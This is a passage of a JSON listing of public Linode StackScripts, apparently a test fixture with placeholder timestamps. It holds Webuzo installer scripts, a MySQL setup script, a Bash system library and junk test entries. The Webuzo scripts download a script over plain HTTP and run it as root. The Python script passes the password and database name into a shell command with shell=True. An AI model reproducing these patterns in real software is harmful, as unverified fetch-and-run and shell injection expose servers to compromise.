      application. \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps
      users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache,
      NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure XCloner
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "XCloner powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install XCloner and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About XCloner :\n#   XCloner
      is a professional website Backup and Restore application designed to allow you
      to create \n#   safe complete backups of any PHP/Mysql website and to be able
      to restore them anywhere.\n#   It works as a native Joomla backup component,
      as a native Wordpress backup plugin and also \n#   as standalone PHP/Mysql backup
      application.\n###########################################################################################################\n\n#
      Install XCloner Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=458&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      XCloner and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, XCloner has been successfully installed\"\necho \" \"\necho
      \"You can now configure XCloner and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 83465, "username":
      "janelle_estelle", "user_gravatar_id": "58c5b6b3e7c996de84adf9c177085ae5", "label":
      "Stack", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu16.04lts"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash\n# <UDF name=\"db_password\" Label=\"MySQL
      root Password\" />\n# <UDF name=\"db_name\" Label=\"Create Database\" default=\"\"
      example=\"Optionally create this database\" />\n# <UDF name=\"db_user\" Label=\"Create
      MySQL User\" default=\"\" example=\"Optionally create this user\" />\n# <UDF
      name=\"db_user_password\" Label=\"MySQL User''s Password\" default=\"\" example=\"User''s
      password\" />\n\n\nsource <ssinclude StackScriptID=\"1\">\n\nsystem_update\npostfix_install_loopback_only\nmysql_install
      \"$DB_PASSWORD\" && mysql_tune 40\nmysql_create_database \"$DB_PASSWORD\" \"$DB_NAME\"\nmysql_create_user
      \"$DB_PASSWORD\" \"$DB_USER\" \"$DB_USER_PASSWORD\"\nmysql_grant_user \"$DB_PASSWORD\"
      \"$DB_USER\" \"$DB_NAME\"\nphp_install_with_apache && php_tune\napache_install
      && apache_tune 40 && apache_virtualhost_from_rdns\ngoodstuff\nrestartServices",
      "user_defined_fields": [{"name": "db_password", "label": "MySQL root Password"},
      {"name": "db_name", "label": "Create Database", "default": "", "example": "Optionally
      create this database"}, {"name": "db_user", "label": "Create MySQL User", "default":
      "", "example": "Optionally create this user"}, {"name": "db_user_password",
      "label": "MySQL User''s Password", "default": "", "example": "User''s password"}]},
      {"id": 978953, "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
      "label": "admin", "description": "fghtdyjt", "ordinal": 0, "logo_url": "", "images":
      ["linode/ubuntu16.04lts", "linode/centos8", "linode/debian9-kube-v1.22.2", "linode/debian11-kube-v1.21.9",
      "linode/alpine3.15"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "ree", "script": "#!/bin/bash\n\ndthfjuffyki", "user_defined_fields":
      []}, {"id": 9226, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Gallery 2 powered by Webuzo", "description": "Gallery is an open source
      web based photo album organizer. Gallery gives you an intuitive way to blend
      photo management seamlessly into your own website whether you''re running a
      small personal site or a large community site.\r\n\r\nServing millions worldwide,
      the Gallery project is the most widely used system of its kind. \r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Gallery 2 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Gallery 2 powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Gallery 2 and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Gallery 2 :\n#   Gallery
      is an open source web based photo album organizer.\n#   Gallery gives you an
      intuitive way to blend photo management seamlessly into your own website \n#   whether
      you''re running a small personal site or a large community site.\n#   Serving
      millions worldwide, the Gallery project is the most widely used system of its
      kind. \n###########################################################################################################\n\n#
      Install Gallery 2 Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=383&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Gallery 2 and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Gallery 2 has been successfully installed\"\necho \" \"\necho
      \"You can now configure Gallery 2 and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1119243, "username":
      "cecillysander", "user_gravatar_id": "b18e5b184afa0a761c23041172947c74", "label":
      "nono", "description": "nono", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu20.04"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "", "script": "#!/bin/bash\r\necho &amp;quot;hello&amp;quot;\r\n", "user_defined_fields":
      []}, {"id": 9227, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Eventum powered by Webuzo", "description": "Eventum is a user-friendly
      and flexible issue tracking system that can be used by a support department
      to track incoming technical support requests, or by a software development team
      to quickly organize tasks and bugs.\r\n\t\t\t\r\nWebuzo is a Single User Control
      Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or
      System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines
      or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Eventum
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Eventum powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Eventum and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Eventum :\n#   Eventum
      is a user-friendly and flexible issue tracking system that can be used by a
      support \n#   department to track incoming technical support requests, or by
      a software development team to quickly\n#   organize tasks and bugs.\n###########################################################################################################\n\n#
      Install Eventum Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=394&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Eventum and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Eventum has been successfully installed\"\necho \" \"\necho
      \"You can now configure Eventum and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1010699, "username":
      "manojserver", "user_gravatar_id": "11b2d04632b07576576c4cc464c99ddf", "label":
      "test", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu21.10"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "", "script": "#!/bin/bash\n\n# <UDF name=\"company_name\" Label=\"Company Name\"
      example=\"My Company\" />\n# <UDF name=\"company_email\" Label=\"Company Email\"
      example=\"my@company.com\" />\n# <UDF name=\"admin_email\" Label=\"Admin Email\"
      example=\"my@company.com\" />\n# <UDF name=\"admin_password\" Label=\"Admin
      Password\" example=\"s3cur39a55w0r0\" />\n\n", "user_defined_fields": [{"name":
      "company_name", "label": "Company Name", "example": "My Company"}, {"name":
      "company_email", "label": "Company Email", "example": "my@company.com"}, {"name":
      "admin_email", "label": "Admin Email", "example": "my@company.com"}, {"name":
      "admin_password", "label": "Admin Password", "example": "s3cur39a55w0r0"}]},
      {"id": 1280267, "username": "andrewmohawk", "user_gravatar_id": "c4a1738bcfba73859d7582676372dc1c",
      "label": "thisisjustatest", "description": "test", "ordinal": 0, "logo_url":
      "", "images": ["linode/ubuntu20.04"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash\necho \"Hello
      world\"", "user_defined_fields": []}, {"id": 73228, "username": "rizerapp",
      "user_gravatar_id": "dc70e4f46019425154b0a652de0657da", "label": "lib-system-ubuntu",
      "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts",
      "linode/ubuntu16.04lts", "linode/ubuntu16.10"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash\n#\n#
      System related utilities\n#\n# Copyright (c) 2010 Filip Wasilewski <en@ig.ma>.\n#\n#
      My ref: http://www.linode.com/?r=aadfce9845055011e00f0c6c9a5c01158c452deb\n\nfunction
      lower {\n    # helper function\n    echo $1 | tr ''[:upper:]'' ''[:lower:]''\n}\n\nfunction
      system_update {\n    apt-get update && apt-get upgrade -y\n}\n\nfunction system_add_user
      {\n    # system_add_user(username, password, groups, shell=/bin/bash)\n    USERNAME=`lower
      $1`\n    PASSWORD=$2\n    SUDO_GROUP=$3\n    SHELL=$4\n    if [ -z \"$4\" ];
      then\n        SHELL=\"/bin/bash\"\n    fi\n    useradd --create-home --shell
      \"$SHELL\" --user-group --groups \"$SUDO_GROUP\" \"$USERNAME\"\n    echo \"$USERNAME:$PASSWORD\"
      | chpasswd\n}\n\nfunction system_add_system_user {\n    # system_add_system_user(username,
      home, shell=/bin/bash)\n    USERNAME=`lower $1`\n    HOME_DIR=$2\n    SHELL=$3\n    if
      [ -z \"$3\" ]; then\n        SHELL=\"/bin/bash\"\n    fi\n    useradd --system
      --create-home --home-dir \"$HOME_DIR\" --shell \"$SHELL\" --user-group $USERNAME\n}\n\nfunction
      system_lock_user {\n    # system_lock_user(username)\n    passwd -l \"$1\"\n}\n\nfunction
      system_get_user_home {\n    # system_get_user_home(username)\n    cat /etc/passwd
      | grep \"^$1:\" | cut --delimiter=\":\" -f6\n}\n\nfunction system_user_add_ssh_key
      {\n    # system_user_add_ssh_key(username, ssh_key)\n    USERNAME=`lower $1`\n    USER_HOME=`system_get_user_home
      \"$USERNAME\"`\n    sudo -u \"$USERNAME\" mkdir \"$USER_HOME/.ssh\"\n    sudo
      -u \"$USERNAME\" touch \"$USER_HOME/.ssh/authorized_keys\"\n    sudo -u \"$USERNAME\"
      echo \"$2\" >> \"$USER_HOME/.ssh/authorized_keys\"\n    chmod 0600 \"$USER_HOME/.ssh/authorized_keys\"\n}\n\nfunction
      system_sshd_edit_bool {\n    # system_sshd_edit_bool (param_name, \"Yes\"|\"No\")\n    VALUE=`lower
      $2`\n    if [ \"$VALUE\" == \"yes\" ] || [ \"$VALUE\" == \"no\" ]; then\n        sed
      -i \"s/^#*\\($1\\).*/\\1 $VALUE/\" /etc/ssh/sshd_config\n    fi\n}\n\nfunction
      system_sshd_permitrootlogin {\n    system_sshd_edit_bool \"PermitRootLogin\"
      \"$1\"\n}\n\nfunction system_sshd_passwordauthentication {\n    system_sshd_edit_bool
      \"PasswordAuthentication\" \"$1\"\n}\n\nfunction system_update_hostname {\n    #
      system_update_hostname(system hostname)\n    if [ -z \"$1\" ]; then\n        echo
      \"system_update_hostname() requires the system hostname as its first argument\"\n        return
      1;\n    fi\n    echo $1 > /etc/hostname\n    hostname -F /etc/hostname\n    echo
      -e \"\\n127.0.0.1 $1 $1.local\\n\" >> /etc/hosts\n}\n\nfunction system_security_logcheck
      {\n    aptitude -y install logcheck logcheck-database\n    # configure email\n    #
      start after setup\n}\n\nfunction system_security_fail2ban {\n    aptitude -y
      install fail2ban\n}\n\nfunction system_security_ufw_configure_basic {\n    #
      see https://help.ubuntu.com/community/UFW\n    ufw logging on\n\n    ufw default
      deny\n\n    ufw allow ssh/tcp\n    ufw limit ssh/tcp\n\n    ufw allow http/tcp\n    ufw
      allow https/tcp\n\n    ufw enable\n}\n\nfunction system_configure_private_network
      {\n    # system_configure_private_network(private_ip)\n    PRIVATE_IP=$1\n    NETMASK=\"255.255.128.0\"\n    cat
      >>/etc/network/interfaces <<EOF\nauto eth0:0\niface eth0:0 inet static\n address
      $PRIVATE_IP\n netmask $NETMASK\nEOF\n    touch /tmp/restart_initd-networking\n}\n\nfunction
      restart_services {\n    # restarts upstart services that have a file in /tmp/needs-restart/\n    for
      service_name in $(ls /tmp/ | grep restart-* | cut -d- -f2-10); do\n        service
      $service_name restart\n        rm -f /tmp/restart-$service_name\n    done\n}\n\nfunction
      restart_initd_services {\n    # restarts upstart services that have a file in
      /tmp/needs-restart/\n    for service_name in $(ls /tmp/ | grep restart_initd-*
      | cut -d- -f2-10); do\n        /etc/init.d/$service_name restart\n        rm
      -f /tmp/restart_initd-$service_name\n    done\n}\n\n# Maintain for compatibility
      with scripts using this library for Ubuntu 10.04\n\nfunction system_get_codename
      {\n    echo `lsb_release -sc`\n}\n\nfunction system_get_release {\n    echo
      `lsb_release -sr`\n}\n\nfunction system_sshd_pubkeyauthentication {\n    system_sshd_edit_bool
      \"PubkeyAuthentication\" \"$1\"\n}\n\nfunction system_update_locale_en_US_UTF_8
      {\n    # locale-gen en_US.UTF-8\n    dpkg-reconfigure locales\n    update-locale
      LANG=en_US.UTF-8\n}\n\nfunction system_enable_universe {\n    sed -i ''s/^#\\(.*deb.*\\)
      universe/\\1 universe/'' /etc/apt/sources.list\n    aptitude update\n}\n\nfunction
      system_security_ufw_install {\n    aptitude -y install ufw\n}", "user_defined_fields":
      []}, {"id": 9228, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Magento 1.7 powered by Webuzo", "description": "Magento is an Open
      Source ecommerce web application launched on March 31, 2008. It was created
      by Varien, building on components of the Zend Framework.\r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Magento 1.7 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Magento 1.7 powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Magento 1.7 and Softaculous Webuzo\n# Description -\n# About Webuzo
      :\n#   Webuzo is a Single User Control Panel which helps users deploy Web Apps
      (WordPress, Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java,
      MongoDB, etc) on their virtual machines or in the cloud.\n#\n# About Magento
      1.7 :\n#   Magento is an Open Source ecommerce web application launched on March
      31, 2008.\n#   It was created by Varien, building on components of the Zend
      Framework.\n###########################################################################################################\n\n#
      Install Magento 1.7 Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=465&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Magento 1.7 and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Magento 1.7 has been successfully installed\"\necho \" \"\necho
      \"You can now configure Magento 1.7 and Softaculous Webuzo at the following
      URL :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing
      Softaculous Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 978956,
      "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
      "label": "Test", "description": "Test", "ordinal": 0, "logo_url": "", "images":
      ["linode/alpine3.12", "linode/alpine3.15"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "Revision Note", "script": "#!/bin/bash\nteffryt",
      "user_defined_fields": []}, {"id": 9229, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "SVNManager powered by Webuzo",
      "description": "SVNManager is a PHP web based tool to administer a Apache Subversion
      repository server. \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which
      helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps
      (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the
      cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure SVNManager
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "SVNManager powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install SVNManager and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About SVNManager :\n#   SVNManager
      is a PHP web based tool to administer a Apache Subversion repository server.
      \n###########################################################################################################\n\n#
      Install SVNManager Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=380&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      SVNManager and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, SVNManager has been successfully installed\"\necho \" \"\necho
      \"You can now configure SVNManager and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1193741, "username":
      "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd", "label":
      "MySQL", "description": "Install MySQL or MariaDB to a Linode. Can also be used
      as a library for other StackScripts.", "ordinal": 0, "logo_url": "", "images":
      ["linode/ubuntu14.04lts", "linode/centos7", "linode/debian8", "linode/fedora22"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import.", "script": "#!/usr/bin/env python\n\n\"\"\"\nMySQL StackScript\n\t\n\tAuthor:
      Ricardo N Feliciano <rfeliciano@linode.com>\n\tVersion: 1.0.0.0\n\tRequirements:\n\t\t-
      ss://linode/python-library <ssinclude StackScriptID=\"3\">\n\nThis StackScript
      both deploys and provides a library for MySQL. The functions \nin this StackScript
      are designed to be run across the Linode Core Distributions:\n\t- Ubuntu\n\t-
      CentOS\n\t- Debian\n\t- Fedora\n\nStackScript User Defined Variables:\n\n<UDF
      name=\"db_root_password\" label=\"MySQL/MariaDB root password\" default=\"\"
      />\n\"\"\"\n\nimport os\nimport subprocess\nimport sys\n\ntry: # we''ll need
      to rename included StackScripts before we can import them\n\tos.rename(\"/root/ssinclude-3\",
      \"/root/pythonlib.py\")\nexcept:\n\tpass\n\nimport pythonlib\n\n\ndef mysql_install(root_pw
      = False, db_name = False):\n\t\"\"\"Install MySQL or MariaDB\"\"\"\n\t# add
      logging support\n\n\tpackage = {\n\t\t''debian'': ''mysql'',\n\t\t''redhat'':
      ''mariadb''\n\t}\n\n\tpythonlib.system_package_install(package[pythonlib.distro[''family'']]
      +\n\t\"-server\")\n\t\n\tmysql_start()\n\n\t# if provided with a root password,
      set it\n\tif root_pw :\n\t\tsubprocess.call([''mysqladmin'', ''-u'', ''root'',
      ''password'', root_pw])\n\t\n\t# if a database name was provided, let''s create
      it\n\tif db_name :\n\t\tsubprocess.call(''mysql -uroot -p'' + root_pw + '' -e
      \"create database '' + db_name + ''\"'', shell=True)\n\n\ndef mysql_start():\n\t\"\"\"Start
      MariaDB on CentOS and Fedora\"\"\"\n\n\tif pythonlib.distro[''family'']  ==
      \"redhat\":\n\t\tsubprocess.call([''systemctl'', ''start'', ''mariadb.service''])\n\n\ndef
      main():\n\t\"\"\"Install MySQL or MariaDB\"\"\"\n\t# add logging support\n\t\n\tpythonlib.init()\n\tpythonlib.system_update()\n\n\tif
      os.environ[''DB_ROOT_PASSWORD''] != \"\":\n\t\tmysql_install(os.environ[''DB_ROOT_PASSWORD''])\n\telse:\n\t\tmysql_install()\n\n\tpythonlib.end()\n\n\nif
      __name__ == \"__main__\":\n\tsys.exit(main())", "user_defined_fields": [{"name":
      "db_root_password", "label": "MySQL/MariaDB root password", "default": ""}]},
      {"id": 9230, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Vty powered by Webuzo", "description": "Vty is a web-based database
      manager script written with Php. It''s for Mysql.\r\n\r\nYou can connect to
      Mysql and see and edit your databases and tables. \r\n\t\t\t\r\nWebuzo is a
      Single User Control Panel which helps users deploy Web Apps (WordPress, Joomla,
      Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their
      virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Vty and
